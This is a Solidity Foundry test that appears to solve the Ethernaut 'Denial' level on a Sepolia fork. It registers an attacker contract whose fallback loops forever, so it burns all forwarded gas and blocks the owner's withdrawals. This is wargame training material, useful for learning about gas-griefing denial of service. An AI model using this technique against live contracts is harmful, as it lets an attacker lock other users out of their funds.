// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/levels/20-Denial/Denial.sol";


contract ContractTest is Test {
    DenialAttack DenialAttackAddr;
    Denial level20 = Denial(payable(0x126539d3af7d0e5fE48C05AA5217314850724E6F));

    function setUp() public {
 
    vm.createSelectFork(vm.rpcUrl("sepolia"));

    }

    function testExploit20() public {
      DenialAttackAddr = new DenialAttack();
      level20.setWithdrawPartner(address(DenialAttackAddr));
      //level20.withdraw();
    }
    
  receive() external payable {}
}
 
contract DenialAttack {

  fallback() external payable {
      // consume all the gas
      while(true) {}
  }
}